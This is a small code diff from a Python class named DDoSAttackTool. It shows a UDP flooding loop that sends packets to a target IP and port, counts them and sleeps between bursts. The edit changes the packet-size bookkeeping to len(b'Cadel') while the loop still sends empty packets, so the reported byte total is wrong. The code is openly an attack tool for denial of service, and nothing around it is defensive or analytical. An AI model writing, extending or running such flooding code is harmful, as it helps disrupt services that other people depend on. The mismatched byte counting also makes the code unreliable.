@@ -140,7 +140,7 @@ class DDoSAttackTool:
             for _ in range(num_packets):
                 sock.sendto(b"", (target_ip, port))
                 self.attack_num += 1
-                packet_size = len(b"")  # Replace b"" with the actual packet data
+                packet_size = len(b"Cadel")  
                 self.total_bytes_sent += packet_size
                 print(f"Sent {self.attack_num} packet to {target_ip} through port: {port}")
                 time.sleep(burst_interval)
